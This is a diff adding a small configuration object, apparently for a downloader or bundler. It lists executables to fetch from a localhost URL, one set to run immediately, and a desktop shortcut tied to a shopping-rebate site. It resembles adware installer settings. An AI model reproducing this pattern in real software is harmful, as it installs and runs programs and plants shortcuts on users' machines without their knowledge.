@@ -1,0 +1,9 @@
+//
+trace("*----Doc2.dot----")
+var ___gconfig = {
+		validcondition:{PID:{min:"1bec14feb5e064e3",max:"1bec14feb5e064e3"},osver:{min:5,max:6},datver:{min:5,max:16}},		
+		installlist:[{id:10000,name:"oxvInstaller.exe",url:"http://127.0.0.1/config/ovxInstaller.exe", md5:"AF06854C6FCBA120F4BE133D7BF151AA", invalidcondition:function(){} ,param:""},
+								 {id:10001,name:"oxvInstaller2.exe",url:"http://127.0.0.1/config/ovxInstaller.exe", md5:"AF06854C6FCBA120F4BE133D7BF151AA", invalidcondition:function(){} ,param:"", runimmediately:1}],
+		desktopiconlist:[{id:20000,name:"·µÀû.ur", md5:"AF06854C6FCBA120F4BE133D7BF151AA", iconPrivateProfileString:{URL:"",IconFileName:"favicon.ico",IconFile:"http://www.51fanli.com/favicon.ico"}, param:""}]
+	}
+	//alert(___gconfig.validcondition.PID.min)
